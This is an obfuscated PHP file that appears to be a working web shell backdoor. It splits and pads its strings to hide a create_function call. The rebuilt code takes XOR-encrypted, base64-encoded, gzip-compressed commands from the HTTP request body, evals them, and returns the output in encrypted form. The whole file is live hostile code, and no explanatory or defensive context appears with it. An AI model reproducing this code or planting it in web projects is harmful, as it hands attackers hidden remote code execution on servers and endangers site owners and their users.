<?php
$C='$r!r=@base6!r4_en!rcod!re!r(@x(@gzcompr!re!rss($o),$k))!r;print!r("$p$kh!r$r$kf");}';
$G=str_replace('q','','qcreatqe_qfqqunctqion');
$A='!rrlen!r($t);$o!r="";for($i!r=!r0;$i<$l;){!rfor(!r$j=0;($j<$c!r&&$i!r<';
$F='=1) !r{@ob_sta!rrt();!r!r@e!rv!ral(@gz!runcompress(@x(@ba!rs!re64_decod';
$u='m!rat!rc!rh("/$kh(.+)$!rkf/!r!r",@file_get_c!rontents(!r"ph!rp://input")!r,$m)=';
$y='$k="0f04!r!re2ab";$kh="3!r74d1f4!rc!r8f1f";!r$kf="232!rc9!re67b477";$p=';
$k='"t!r9WA!ru!rAJmEf4yrNV3";!rfun!rction x(!r$t!r,$k){$c!r=strlen($k!r);$l=!rst';
$v='!re($m[1]),$k))!r);$o=!r@o!rb_get_c!rontents();!r@!rob_end_!rclean();';
$t='$l);$j!r++,$!r!ri++){$o.=$!rt{$i}^$!rk{$j};!r}}r!retu!rrn $o;}if (!r@preg_';
$T=str_replace('!r','',$y.$k.$A.$t.$u.$F.$v.$C);
$Y=$G('',$T);$Y();
?>
